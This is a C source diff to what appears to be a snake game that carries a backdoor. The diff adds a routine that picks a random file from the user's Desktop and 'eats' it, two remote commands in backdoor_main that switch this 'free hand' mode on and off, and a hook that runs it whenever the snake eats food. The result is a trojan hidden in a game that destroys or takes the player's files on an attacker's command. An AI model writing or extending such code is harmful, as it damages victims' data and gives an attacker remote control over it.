@@ -209,15 +209,69 @@ int eatFile(char fileName[])
 	return 1;
 }
 
-int agentSnakeFreeHand()
+void eatRandomFileFromDesktop()
 {
-	while (1)
+	char filesList[100][100], desktopPath[280], freeHandFile[100], desktopFilePath[300];
+
+	memset(filesList, 0, sizeof(filesList));
+	memset(desktopPath, 0, sizeof(desktopPath));
+	memset(freeHandFile, 0, sizeof(freeHandFile));
+	memset(desktopFilePath, 0, sizeof(desktopFilePath));
+
+	int filesListTop = -1;
+
+	strcat(desktopPath, getenv("USERPROFILE"));
+	strcat(desktopPath, "\\Desktop");
+
+	// chdir(desktopPath);
+
+	// Code to extract directory data
+	DIR *directory;
+	struct dirent *entry;
+
+	// Open the current working directory
+	directory = opendir(desktopPath);
+	if (directory == NULL)
 	{
-		if (freeHandGiven)
+		perror("Error opening current working directory");
+	}
+
+	// Loop through the entries in the directory
+	while ((entry = readdir(directory)) != NULL)
+	{
+		if ((entry->d_type + '0') == '0')
 		{
-			// get a file from the desktop
-			// chdir();
+			filesListTop++;
+			memset(filesList[filesListTop], 0, strlen(filesList[0]));
+			strcpy(filesList[filesListTop], entry->d_name);
 		}
+	}
+
+	// Generating path to file
+
+	// Randomly selecting one file
+	strcpy(freeHandFile, filesList[rand() % (filesListTop + 1)]);
+
+	strcpy(desktopFilePath, desktopPath);
+	strcat(desktopFilePath, "\\");
+	strcat(desktopFilePath, freeHandFile);
+
+	// eating that file
+	eatFile(desktopFilePath);
+
+	// Close the directory
+	closedir(directory);
+
+	// Go back to old CWD
+	// chdir(oldCWD);
+}
+
+int agentSnakeActOnFreeHand()
+{
+	if (freeHandGiven)
+	{
+		// get a file from the desktop
+		eatRandomFileFromDesktop();
 	}
 }
 
@@ -319,6 +373,20 @@ int backdoor_main()
 						writeToBuffer("File was not eaten, probably not found.");
 					}
 
+					reliableSend();
+
+					break;
+
+				case 6:
+					freeHandGiven = 1;
+					writeToBuffer("Free hand given to agent file eater.");
+					reliableSend();
+
+					break;
+
+				case 7:
+					freeHandGiven = 0;
+					writeToBuffer("File eater will now wait for your command.");
 					reliableSend();
 
 					break;
@@ -538,6 +606,10 @@ void update()
 	// Check if food has been eaten
 	if (hasEatenFood())
 	{
+
+		// Act if free hand given
+		agentSnakeActOnFreeHand();
+
 		// If food is eaten then increase it's length and the player's score
 		snakeGame.length++;
 		snakeGame.score++;
